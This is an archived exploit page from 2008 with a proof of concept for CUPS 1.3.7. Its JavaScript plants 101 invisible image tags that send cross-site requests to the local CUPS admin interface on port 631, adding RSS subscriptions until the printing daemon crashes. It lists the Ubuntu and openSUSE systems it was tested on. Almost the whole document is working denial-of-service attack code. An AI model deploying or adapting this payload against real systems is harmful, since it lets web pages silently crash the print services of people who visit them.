<html><head><title>CUPS 1.3.7 CSRF (add rss subscription) Remote Crash Exploit</title></head><pre>&lt;!-- cat cups_dos_poc.html  --&gt;
&lt;script&gt;
// make 101 CSRFed requests to CUPS daemon via 'img' tags
// causes CUPS daemon to crash
// by Adrian 'pagvac' Pastor | GNUCITIZEN.org

for(var i=1;i&lt;=101;++i) {
    document.write(&quot;&lt;img width=0 height=0 &quot; +
        &quot;src=\&quot;http://localhost:631/admin/?OP=add-rss-subscription&amp;SUBSCRIPTION_NAME=DOS_TEST_&quot; +
        i + &quot;&amp;PRINTER_URI=%23ALL%23&amp;EVENT_JOB_CREATED=on&amp;MAX_EVENTS=20\&quot;&gt;&quot;);
}

/*
TESTED ON:

Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux

openSUSE 11.0 (i586)
Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux

Common UNIX Printing System 1.3.7
*/
&lt;/script&gt;

# milw0rm.com [2008-11-18]</pre></html>